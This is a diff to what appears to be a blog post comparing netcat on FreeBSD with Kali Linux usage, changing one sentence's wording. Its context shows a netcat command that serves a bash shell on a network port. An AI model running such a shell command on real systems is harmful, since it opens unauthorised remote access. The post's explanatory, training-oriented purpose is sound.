@@ -225,7 +225,7 @@ When we were running an earlier experiment, we ran into a real hazard with some 
 On the plus side, `nc` is a default command for FreeBSD base installs.  We'll experiment with this some later.  As we have already mentioned, `fetch` is also automatically included; it's FreeBSD's sister to `wget`.  
 
 ### netcat Doesn't Work The Same
-For those of us who've been pentesting with Kali Linux, it's common to see the following uses of netcat:
+For those of us who've been training for pentests with Kali Linux \[4\], it's common to see the following uses of netcat:
 {% highlight shell %}
 nc -nvlp 192.168.1.100 4444 -e /bin/bash
 {% endhighlight %}
